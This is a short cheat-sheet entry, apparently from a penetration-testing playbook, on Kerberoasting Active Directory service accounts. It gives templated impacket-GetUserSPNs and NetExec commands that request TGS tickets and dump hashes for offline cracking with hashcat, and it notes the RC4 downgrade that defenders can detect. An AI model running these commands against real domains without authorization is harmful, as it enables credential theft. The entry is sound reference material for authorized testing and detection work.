---
id: kerberoast-getuserspns
title: Kerberoast SPNs (request + crack offline)
section: Microsoft Windows Kerberos — TCP 88
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1558.003]
platform: [windows, network]
source: hacktheplanet §"Microsoft Windows Kerberos — TCP 88"
pair: kerberoasting-4769
---

Needs valid domain creds; requests TGS tickets for accounts with SPNs and
dumps crackable hashes you crack offline (`hashcat -m 13100`). The RC4 (0x17)
encryption downgrade is the tell on the blue side.

```sh
impacket-GetUserSPNs -request -dc-ip {{rhost}} {{domain}}/{{user}}
nxc ldap {{rhost}} -u {{user}} -p {{password}} --kerberoasting kerb.txt
```
